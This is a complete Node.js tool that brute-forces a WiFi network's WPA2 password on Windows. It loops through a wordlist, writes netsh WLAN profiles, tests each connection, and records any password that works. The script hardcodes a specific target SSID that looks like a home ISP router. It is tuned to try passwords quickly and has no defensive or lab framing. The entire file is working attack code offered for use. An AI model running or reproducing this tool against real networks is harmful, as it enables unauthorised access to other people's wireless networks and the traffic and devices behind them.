/**
 * WiFi PSK Brute-Force — Optimized async Windows netsh
 *
 * Key optimizations:
 *   - Single batched netsh command per attempt
 *   - Skip profile delete between attempts
 *   - Fast-fail: detect disconnected in ~1s
 *   - Native setTimeout (no ping/powershell sleep)
 *   - IP check only on success
 *
 * Target: ~2.5s per attempt
 */

const { exec, execSync } = require('child_process');
const { promisify } = require('util');
const fs = require('fs');
const path = require('path');

const execAsync = promisify(exec);

const TARGET_SSID  = 'PLDTHOMEFIBRBd6BN';
const PROFILE_NAME = 'bruteforce_tmp';
const TEMP_XML     = path.join(__dirname, '_wf_profile.xml');
const RESULT_FILE  = path.join(__dirname, '_wf_result.json');

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function run(cmd) {
  try {
    const { stdout } = await execAsync(cmd, { encoding: 'utf8', timeout: 15000 });
    return stdout.trim();
  } catch {
    return '';
  }
}

function generateProfileXml(ssid, password) {
  return `<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
  <name>${PROFILE_NAME}</name>
  <SSIDConfig>
    <SSID>
      <name>${ssid}</name>
    </SSID>
  </SSIDConfig>
  <connectionType>ESS</connectionType>
  <connectionMode>manual</connectionMode>
  <autoSwitch>false</autoSwitch>
  <MSM>
    <security>
      <authEncryption>
        <authentication>WPA2PSK</authentication>
        <encryption>AES</encryption>
        <useOneX>false</useOneX>
      </authEncryption>
      <sharedKey>
        <keyType>passPhrase</keyType>
        <protected>false</protected>
        <keyMaterial>${password}</keyMaterial>
      </sharedKey>
    </security>
  </MSM>
</WLANProfile>`;
}

function parseInterfaces(output) {
  const stateMatch = output.match(/State\s*:\s*(.+)/i);
  const ssidMatch  = output.match(/SSID\s+:\s*(.+)/i);
  return {
    state: stateMatch ? stateMatch[1].trim() : 'unknown',
    ssid: ssidMatch ? ssidMatch[1].trim() : '',
    connected: (stateMatch ? stateMatch[1].trim() : '').toLowerCase() === 'connected',
  };
}

async function getIp() {
  try {
    const { stdout } = await execAsync('ipconfig', { encoding: 'utf8', timeout: 5000 });
    const wifiSection = stdout.split(/Wireless LAN adapter Wi-Fi/)[1] || '';
    const ipMatch = wifiSection.match(/IPv4 Address.*?:\s*([\d.]+)/);
    return ipMatch ? ipMatch[1] : '';
  } catch {
    return '';
  }
}

async function tryPassword(ssid, password) {
  fs.writeFileSync(TEMP_XML, generateProfileXml(ssid, password));

  const cmd = `netsh wlan add profile filename="${TEMP_XML}" >nul 2>&1 & netsh wlan connect name="${PROFILE_NAME}" >nul 2>&1 & ping -n 2 127.0.0.1 >nul & netsh wlan show interfaces`;

  const output = await run(cmd);
  const status = parseInterfaces(output);

  if (status.connected) {
    if (status.ssid === ssid || status.ssid === PROFILE_NAME || status.ssid === '') {
      const ip = await getIp();
      return { success: true, ip, state: 'connected' };
    }
    return { success: false, ip: '', state: 'wrong_ssid' };
  }

  if (status.state.toLowerCase() === 'disconnected' || status.state.toLowerCase() === 'not connected') {
    return { success: false, ip: '', state: 'auth_fail' };
  }

  if (status.state.toLowerCase().includes('authenticat') || status.state.toLowerCase().includes('connect')) {
    await sleep(1500);
    const retryOutput = await run('netsh wlan show interfaces');
    const retryStatus = parseInterfaces(retryOutput);
    if (retryStatus.connected) {
      const ip = await getIp();
      return { success: true, ip, state: 'connected' };
    }
    return { success: false, ip: '', state: retryStatus.state };
  }

  return { success: false, ip: '', state: status.state };
}

function cleanup() {
  try { execSync(`netsh wlan delete profile name="${PROFILE_NAME}" 2>nul`, { stdio: 'ignore', timeout: 3000 }); } catch {}
  try { fs.unlinkSync(TEMP_XML); } catch {}
}

async function bruteForce(opts = {}) {
  const targetSsid = opts.ssid || TARGET_SSID;
  const signal = opts.signal || null;
  const startTime = Date.now();

  let passwords;
  if (opts.passwords && Array.isArray(opts.passwords)) {
    passwords = opts.passwords;
  } else if (opts.wordlistFile) {
    const wlPath = path.isAbsolute(opts.wordlistFile) ? opts.wordlistFile : path.resolve(opts.wordlistFile);
    if (!fs.existsSync(wlPath)) throw new Error(`Wordlist not found: ${wlPath}`);
    passwords = fs.readFileSync(wlPath, 'utf8')
      .split('\n')
      .map(l => l.trim())
      .filter(l => l.length >= 8 && l.length <= 63 && !l.startsWith('#'));
  } else {
    throw new Error('No passwords provided.');
  }

  const total = passwords.length;
  const estMinutes = Math.round((total * 2.5) / 60);

  if (!opts.force) {
    const scanOutput = await run('netsh wlan show networks mode=bssid');
    if (!scanOutput.includes(targetSsid)) {
      return { found: false, attempts: 0, elapsed: 0, error: `SSID "${targetSsid}" not found in range` };
    }
  }

  console.log(`\n  [bruteforce] Target: ${targetSsid}`);
  console.log(`  [bruteforce] Wordlist: ${total} passwords`);
  console.log(`  [bruteforce] Est. time: ~${estMinutes} minutes`);
  console.log(`  [bruteforce] Starting...\n`);

  let found = false;
  let foundPassword = '';
  let foundIp = '';

  for (let i = 0; i < total; i++) {
    if (signal && signal.aborted) {
      cleanup();
      return { found: false, attempts: i, elapsed: Math.round((Date.now() - startTime) / 1000), aborted: true };
    }

    const result = await tryPassword(targetSsid, passwords[i]);
    const elapsed = Math.round((Date.now() - startTime) / 1000);
    const attemptsDone = i + 1;
    const rate = elapsed > 0 ? ((attemptsDone / elapsed) * 60).toFixed(1) : '0';
    const etaMin = attemptsDone > 0 ? Math.round(((total - attemptsDone) * (elapsed / attemptsDone)) / 60) : estMinutes;
    const percent = Math.round((attemptsDone / total) * 100);

    const pad = String(total).length;
    process.stdout.write(`  [${String(attemptsDone).padStart(pad)}/${total}] "${passwords[i]}" -> ${result.state}\n`);

    if (opts.onProgress) {
      opts.onProgress({
        index: i, total, password: passwords[i], state: result.state,
        elapsed, rate, eta: etaMin, percent, attemptsDone,
      });
    }

    if (result.success) {
      found = true;
      foundPassword = passwords[i];
      foundIp = result.ip;
      console.log(`\n  FOUND: "${foundPassword}" IP: ${foundIp} (${attemptsDone}/${total}, ${elapsed}s)\n`);
      if (opts.onFound) opts.onFound({ password: foundPassword, ip: foundIp, attempts: attemptsDone, elapsed });
      fs.writeFileSync(RESULT_FILE, JSON.stringify({
        ssid: targetSsid, password: foundPassword, ip: foundIp,
        attempts: attemptsDone, elapsed_seconds: elapsed,
        timestamp: new Date().toISOString(),
      }, null, 2));
      break;
    }

    if (attemptsDone % 50 === 0 || attemptsDone === total) {
      const barLen = 30;
      const filled = Math.round(barLen * attemptsDone / total);
      const bar = '#'.repeat(filled) + '-'.repeat(barLen - filled);
      console.log(`  [${bar}] ${percent}% | ${rate}/min | ETA ~${etaMin}min`);
    }
  }

  cleanup();

  if (!found) {
    const elapsed = Math.round((Date.now() - startTime) / 1000);
    const rate = elapsed > 0 ? ((total / elapsed) * 60).toFixed(1) : '0';
    console.log(`\n  NOT FOUND after ${total} attempts (${elapsed}s, ${rate}/min)\n`);
  }

  return {
    found, password: foundPassword, ip: foundIp,
    attempts: total, elapsed: Math.round((Date.now() - startTime) / 1000),
  };
}

module.exports = { bruteForce, TARGET_SSID };
